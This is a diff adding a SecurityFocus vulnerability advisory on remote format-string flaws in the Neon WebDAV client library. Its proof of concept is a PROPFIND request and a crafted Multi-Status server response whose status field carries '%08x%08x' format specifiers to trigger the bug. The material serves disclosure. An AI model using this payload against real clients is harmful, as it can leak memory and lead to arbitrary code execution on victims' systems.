@@ -1,0 +1,44 @@
+source: http://www.securityfocus.com/bid/10136/info 
+
+It has been reported that the Neon client library is prone to multiple remote format string vulnerabilities. This issue is due to a failure of the application to properly implement format string functions.
+
+Ultimately this vulnerability could allow for execution of arbitrary code on the system implementing the affected client software, which would occur in the security context of the server process.
+
+Request
+- -------
+
+PROPFIND /example/resource/string/ HTTP/1.1
+Pragma: no-cache
+Cache-control: no-cache
+Accept: text/*, image/jpeg, image/png, image/*, */*
+Accept-Encoding: x-gzip, gzip, identity
+Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: www.example.com
+Depth: 0
+
+Response
+- --------
+
+HTTP/1.1 207 Multi-Status
+X-Cocoon-Version: 2.1
+Set-Cookie: JSESSIONID=cookie_data; Path=/example
+Content-Type: text/xml
+Transfer-Encoding: chunked
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<D:multistatus xmlns:D="DAV:">
+
+<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
+<D:href>/lenya/blog/authoring/entries/2003/08/24/peanuts/</D:href>
+<D:propstat>
+<D:prop>
+<lp1:resourcetype><D:collection/></lp1:resourcetype>
+<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
+</D:prop>
+<D:status>%08x%08x</D:status>
+</D:propstat>
+</D:response>
+
+</D:multistatus>
